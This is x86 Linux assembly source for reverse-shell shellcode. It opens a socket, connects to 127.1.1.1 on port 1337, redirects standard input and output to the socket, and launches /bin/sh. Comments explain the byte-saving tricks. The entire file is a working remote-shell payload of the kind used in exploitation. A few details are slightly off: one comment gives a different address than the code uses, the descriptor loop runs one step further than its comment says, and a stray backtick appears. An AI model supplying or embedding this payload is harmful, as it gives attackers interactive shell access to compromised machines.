global _start
section .text

_start:
    ; Socket functions should be accessed through socketcall()
    ; References:
    ;   1. http://man7.org/linux/man-pages/man2/socketcall.2.html
    ;   2. http://lxr.free-electrons.com/source/net/socket.c?v=2.6.35#L2210
    ; Call ids are defined in /usr/include/linux/net.h and should be put in EBX

    ;
    ; socket(PF_INET, SOCK_STREAM, IPPROTO_IP)
    ;
    cdq                 ; EDX = 0x0 | Saves a byte
    xor ebx, ebx
    inc ebx             ; EBX = 0x1 | #define SYS_SOCKET	1
                        ; saves a byte instead of mov bl, 1
    push edx            ; zeroed out earlier
                        ; protocol = 0
    push ebx            ; SOCK_STREAM = 1
                        ; Needed for bind(), can be used here to save a few bytes
    push byte 0x2       ; PF_INET = 2
    mov ecx, esp
    push byte 0x66      ; socketcall()
    pop eax             ; EAX = 0x66
    int 0x80

    xchg esi, eax       ; sockfd is now stored in esi

    ;
    ; connect(3, {sa_family=AF_INET, sin_port=htons(1337), sin_addr=inet_addr("127.0.0.1")}, 16)
    ;
    inc ebx             ; EBX = 0x2 
    push 0x0101017f       ; sockaddr.sin_addr.s_addr: 127.1.1.1 (big endian)
    push word 0x3905    ; sockaddr.sin_port       : PORT = 1337
    push bx             ; sockaddr.sin_family     : AF_INET = 2
    mov ecx, esp        ; ECX holds pointer to struct sockaddr

    push 0x10           ; sizeof(sockaddr)
    push ecx            ; pointer to sockaddr
    push esi            ; sockfd
    mov ecx, esp        ; ECX holds pointer to arguments
    inc ebx             ; EBX = 0x3 | #define SYS_CONNECT	3
    mov al, 0x66        ; socketcall()
    int 0x80

    xchg ebx, esi
    
    ;
    ; dup2(ebx, {0,1,2})
    ;
    xor ecx, ecx
lbl:
    mov al, 0x3f		; dup2()
    int 0x80
    inc ecx				; Iterate over {0,1,2}
    cmp cl, 0x4			; Are we done?
    jne lbl				; Nope
    
    ; execve("/bin//sh", NULL, NULL)
    push edx			; Null terminator
    push 0x68732f2f		; "hs//"
    push 0x6e69622f		; "nib/"
    
    mov ebx, esp		; EBX points to "/bin//sh"
    mov ecx, edx		; ECX = NULL`
    
    mov al, 0xb			; execve()
    int 0x80
